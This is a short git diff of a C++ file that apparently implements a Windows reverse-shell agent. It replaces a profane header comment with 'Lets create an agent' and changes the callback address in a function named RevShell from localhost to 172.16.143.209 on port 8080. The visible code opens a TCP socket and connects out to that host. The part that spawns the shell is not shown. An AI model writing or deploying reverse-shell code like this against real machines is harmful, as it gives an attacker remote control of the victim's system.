@@ -1,5 +1,9 @@
 /******************************************************************************* 
-** Shit shit shit shit fuck you fuck you fuck you fuck you shit shit shit shit
+** Lets create an agent.
+** Sept 30 2019
+** 
+**
+**
 *******************************************************************************/
 
 #include <iostream>
@@ -20,7 +24,7 @@ void RevShell()
     SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    addr.sin_addr.s_addr = inet_addr("172.16.143.209");
     addr.sin_port = htons(8080);
 
     if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
